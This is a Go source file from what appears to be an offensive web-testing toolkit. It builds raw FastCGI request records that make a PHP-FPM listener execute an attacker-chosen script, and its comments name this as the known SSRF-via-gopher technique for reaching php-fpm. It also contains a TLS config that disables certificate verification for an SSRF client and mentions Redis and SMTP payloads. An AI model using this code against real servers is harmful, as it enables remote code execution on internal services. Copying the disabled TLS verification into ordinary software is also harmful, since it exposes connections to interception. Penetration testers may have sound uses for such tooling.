package webgo

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"strings"
	"time"
)

// insecureTLS is a shared TLS config with verification disabled. Only used
// by SSRFClient when AllowInsecure is set — internal hosts often present
// self-signed certificates and verification would just get in the way.
func insecureTLS() *tls.Config {
	return &tls.Config{InsecureSkipVerify: true} //nolint:gosec
}

// buildFCGIRequest builds a minimal FastCGI record sequence that asks a
// PHP-FPM listener to execute scriptPath with the given params. This is
// the classic "Gynvael Coldwind" shape used to reach php-fpm from an SSRF
// via gopher://. The caller encodes the result into the gopher URL
// (each byte is percent-encoded, CRLFs at record boundaries).
//
// Record structure (FastCGI spec):
//
//	header (8): version(1) type(1) requestId(2) contentLength(2) padding(2) reserved(1)
//	content (contentLength)
//	padding (paddingLength)
//
// Records we emit:
//
//	type 1  BEGIN_REQUEST
//	type 4  PARAMS (0 or more, terminated by empty PARAMS record)
//	type 5  STDIN   (empty, terminated)
func buildFCGIRequest(scriptPath string, params map[string]string) []byte {
	var buf bytes.Buffer

	// BEGIN_REQUEST
	begin := make([]byte, 8)
	binary.BigEndian.PutUint16(begin[0:2], 1) // role = RESPONDER
	begin[2] = 0                              // flags: no keepalive
	writeFCGIRecord(&buf, 1, 1, begin)

	// build PARAMS content
	if params == nil {
		params = map[string]string{}
	}
	if _, ok := params["SCRIPT_FILENAME"]; !ok {
		params["SCRIPT_FILENAME"] = scriptPath
	}
	if _, ok := params["REQUEST_METHOD"]; !ok {
		params["REQUEST_METHOD"] = "GET"
	}
	if _, ok := params["GATEWAY_INTERFACE"]; !ok {
		params["GATEWAY_INTERFACE"] = "CGI/1.1"
	}
	if _, ok := params["SERVER_PROTOCOL"]; !ok {
		params["SERVER_PROTOCOL"] = "HTTP/1.1"
	}

	var pc bytes.Buffer
	writeFCGIParam(&pc, "SCRIPT_FILENAME", params["SCRIPT_FILENAME"])
	writeFCGIParam(&pc, "REQUEST_METHOD", params["REQUEST_METHOD"])
	writeFCGIParam(&pc, "GATEWAY_INTERFACE", params["GATEWAY_INTERFACE"])
	writeFCGIParam(&pc, "SERVER_PROTOCOL", params["SERVER_PROTOCOL"])
	for k, v := range params {
		switch k {
		case "SCRIPT_FILENAME", "REQUEST_METHOD", "GATEWAY_INTERFACE", "SERVER_PROTOCOL":
			continue
		}
		writeFCGIParam(&pc, k, v)
	}
	writeFCGIRecord(&buf, 4, 1, pc.Bytes())
	writeFCGIRecord(&buf, 4, 1, nil) // empty PARAMS = end of params

	// STDIN (empty terminator)
	writeFCGIRecord(&buf, 5, 1, nil)

	return buf.Bytes()
}

// writeFCGIRecord emits a FastCGI record with header, content, and padding.
func writeFCGIRecord(buf *bytes.Buffer, recType, reqID uint8, content []byte) {
	clen := len(content)
	plen := (8 - (clen % 8)) % 8
	hdr := make([]byte, 8)
	hdr[0] = 1 // version
	hdr[1] = recType
	binary.BigEndian.PutUint16(hdr[2:4], uint16(reqID))
	binary.BigEndian.PutUint16(hdr[4:6], uint16(clen))
	hdr[6] = byte(plen)
	buf.Write(hdr)
	buf.Write(content)
	if plen > 0 {
		buf.Write(make([]byte, plen))
	}
}

// writeFCGIParam encodes one name/value pair with FastCGI length encoding.
func writeFCGIParam(buf *bytes.Buffer, name, value string) {
	writeLen(buf, len(name))
	writeLen(buf, len(value))
	buf.WriteString(name)
	buf.WriteString(value)
}

func writeLen(buf *bytes.Buffer, n int) {
	if n < 128 {
		buf.WriteByte(byte(n))
		return
	}
	var b [4]byte
	binary.BigEndian.PutUint32(b[:], uint32(n)|0x80000000)
	buf.Write(b[:])
}

// --- small generic helpers ---

// orDefault returns v if non-empty, else def.
func orDefault(v, def string) string {
	if v == "" {
		return def
	}
	return v
}

// mustTimeout parses a duration with a default.
func mustTimeout(s string, def time.Duration) time.Duration {
	d, err := time.ParseDuration(s)
	if err != nil {
		return def
	}
	return d
}

// trimCRLF removes CR and LF from s — used to sanitize Redis / SMTP payloads.
func trimCRLF(s string) string {
	s = strings.ReplaceAll(s, "\r", "")
	s = strings.ReplaceAll(s, "\n", "")
	return s
}
